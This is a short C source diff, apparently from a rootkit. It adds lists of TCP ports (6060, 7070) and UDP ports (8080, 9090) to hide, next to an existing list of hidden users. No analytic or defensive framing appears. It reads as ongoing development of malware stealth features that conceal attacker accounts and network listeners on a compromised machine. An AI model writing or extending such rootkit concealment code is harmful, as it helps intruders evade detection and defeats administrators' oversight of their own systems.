@@ -31,3 +31,15 @@ const char *ROOTI_HIDDEN_USERS[] = {
     "omre"
 };
 DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_USERS);
+
+const unsigned short ROOTI_HIDDEN_TCP_PORTS[] = {
+    6060,
+    7070
+};
+DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_TCP_PORTS);
+
+const unsigned short ROOTI_HIDDEN_UDP_PORTS[] = {
+    8080,
+    9090
+};
+DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_UDP_PORTS);
